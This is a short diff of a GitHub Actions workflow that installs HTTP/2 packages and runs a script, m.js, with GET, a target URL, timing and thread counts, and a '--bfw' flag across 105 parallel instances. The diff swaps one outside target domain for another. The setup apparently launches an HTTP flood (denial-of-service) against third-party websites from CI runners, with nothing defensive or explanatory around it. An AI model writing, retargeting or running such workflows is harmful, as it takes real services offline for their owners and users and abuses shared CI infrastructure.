@@ -30,7 +30,7 @@ jobs:
         run: npm install hpack.js chalk hpack
       
       - name: Run m.js
-        run: node m.js GET https://sys.aiminidoge.com/deposit/ 400 4 100 --full --debug --cache
+        run: node m.js GET https://thecountbot.lol/6901966783-41c1f663-73ff-474a-8b5b-7aebf27b6ef8 400 300 10 --bfw --debug 
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
           TOTAL_INSTANCES: 105
